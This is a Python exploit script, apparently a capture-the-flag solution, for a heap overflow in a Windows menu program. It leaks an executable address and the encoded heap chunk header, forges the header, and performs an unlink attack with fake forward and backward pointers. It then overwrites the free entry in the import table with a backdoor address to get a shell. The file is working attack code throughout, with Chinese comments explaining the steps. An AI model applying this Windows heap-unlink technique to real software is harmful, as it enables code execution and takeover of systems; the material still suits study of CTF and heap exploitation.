#coding:utf8
from winpwn import *

sh = remote('127.0.0.1',2333)

def sendlineafter(a,b):
   sh.recvuntil(a)
   sh.sendline(b)

def sendafter(a,b):
   sh.recvuntil(a)
   sh.send(b)

sh.sendlineafter = sendlineafter;
sh.sendafter = sendafter

sh.sendlineafter('what is your name:','ha1vk')
sh.recvuntil('gift:')
backdoor_addr = int(sh.recvuntil('\n')[0:-1],16)
exe_base = backdoor_addr - 0x706
print 'backdoor=',hex(backdoor_addr)
print 'exe_base=',hex(exe_base)

def add(size,content):
   sh.sendlineafter('>>','1')
   sh.sendlineafter('size:',str(size))
   sh.sendafter('content:',content)

def delete(index):
   sh.sendlineafter('>>','2')
   sh.sendlineafter('index:',str(index))

def show(index):
   sh.sendlineafter('>>','3')
   sh.sendlineafter('index:',str(index))

def edit(index,content):
   sh.sendlineafter('>>','4')
   sh.sendlineafter('index:',str(index))
   sh.sendafter('content:',content)


add(0x88,'a'*0x88) #0
add(0x80,'b'*0x80) #1
add(0x80,'c'*0x80) #2
add(0x20,'d'*0x20) #3

#泄露出chunk1的头数据
show(0)
sh.recvuntil('a'*0x88)
header_data = u64(sh.recvuntil('\n')[0:-1].ljust(8,'\x00'))
print 'header_data=',hex(header_data)
#计算出用于加密的mask
first_4_mask = (header_data & 0xFFFFFFFF) ^ 0x8010009
prev_size_mask = ((header_data >> 32) & 0xFFFF) ^ 0x9
print 'first_4_mask=',hex(first_4_mask)
print 'prev_size_mask=',hex(prev_size_mask)


#伪造chunk1的header
#size = 0x90 / 0x10 = 0x9
size = 0x9
flag = 0
#计算校验字节
smallTagIndex = 0 ^ size
fake_header = (smallTagIndex << 24) + (flag << 16) + size
#加密header
fake_header = fake_header ^ first_4_mask
prev_size = 0x9
#加密prev_size
prev_size ^= prev_size_mask
fake_header = (0x10 << 56) + (prev_size << 32) + fake_header
print 'fake_header=',hex(fake_header)
edit(0,'a'*0x88 + p64(fake_header)) #伪造1的状态
heap1_ptr_addr = exe_base + 0x7048
#伪造flink和blink
edit(1,p64(heap1_ptr_addr - 0x8) + p64(heap1_ptr_addr))
#unlink
delete(2)
free_iat = exe_base + 0x837C
edit(1,p64(free_iat))
#修改free的iat表
edit(1,p64(backdoor_addr))
#getshell
delete(0)

sh.interactive()
